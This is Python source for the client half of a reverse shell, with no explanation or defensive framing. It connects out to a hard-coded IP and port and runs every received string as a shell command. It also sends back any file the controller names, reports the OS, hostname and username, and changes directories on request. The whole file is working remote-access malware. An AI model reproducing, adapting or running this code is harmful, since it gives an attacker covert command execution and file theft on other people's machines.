from time import sleep
import socket
import subprocess
import os
import platform
import getpass
import colorama

SHOST = "172.31.176.1"
SPORT = 7123

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SHOST, SPORT))

while True: 
    try: 
        input_h = f"""{colorama.Fore.RED}{getpass.getuser()}@{platform.node()}{colorama.Style.RESET_ALL}:{colorama.Fore.LIGHTBLUE_EX}{os.getcwd()}{colorama.Style.RESET_ALL}$ """
        s.sendall(input_h.encode())
        vStdout, vStderr = None, None
        cmd = s.recv(1024).decode("utf-8")  # adjust the byte limit

        ### cmds
        if cmd == "smth":
            pass
        # Download files
        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as fs:
                data = fs.read(1024)    # adjust
                while data:
                    print("Transfering", data) # comment, cause terminal will be packed
                    s.sendall(data)
                    data = fs.read(1024)    # adjust
                sleep(1)
                s.sendall(b"check")
            print("Data was sent.")

        # Get system info
        elif cmd == "sysinfo":
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            s.sendall(sysinfo.encode())

     # Change directory
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            s.sendall("Changed directory to {}".format(os.getcwd()).encode())
        

        elif cmd == "bye":
            s.sendall(b'shutting connection down')
            break


        
        else:
            exe = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            vStdout, vStderr = exe.communicate()
            if not vStdout:
                s.sendall(vStderr)
            else:
                s.sendall(vStdout)
        
        # if smth brakes 

        if not cmd: 
            print("some shit happend")
            break
    except Exception as oopsie:
    #    s.send(f"Umm, error: {oppsie}")    # this doesnt work. needs to be encoded: 
        s.sendall("Umm, error: {}".format(str(oopsie)).encode())

s.close()